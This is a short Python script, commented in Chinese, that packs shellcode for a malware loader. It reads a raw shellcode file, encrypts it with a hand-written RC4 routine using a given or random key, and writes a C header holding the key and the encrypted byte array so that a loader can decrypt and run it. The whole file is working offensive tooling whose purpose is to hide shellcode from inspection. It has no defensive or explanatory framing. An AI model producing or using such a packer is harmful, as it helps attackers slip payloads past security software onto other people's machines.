#!/usr/bin/env python3
# 载荷打包器：shellcode → RC4（密钥派生）→ C 数组（嵌入 loader）
# 用法：python3 payload.py <shellcode.bin> [key]  → 输出 payload.h
import sys, os, base64

def rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    out = bytearray(); i = j = 0
    for b in data:
        i = (i + 1) % 256; j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

sc = open(sys.argv[1], 'rb').read()
key = (sys.argv[2] if len(sys.argv) > 2 else os.urandom(16).hex()).encode()
enc = rc4(key, sc)
hdr = f"// 自动生成（payload.py）：原文 {len(sc)} 字节，RC4 加密后 {len(enc)} 字节\n"
arr = ','.join(str(b) for b in enc)
open('payload.h', 'w').write(hdr + f'static const char KEY[] = "{key.decode()}";\nstatic const unsigned char BUF[] = {{{arr}}};\nstatic const unsigned int LEN = {len(enc)};\n')
print(f"[+] payload.h 生成（key={key.decode()[:4]}…）")
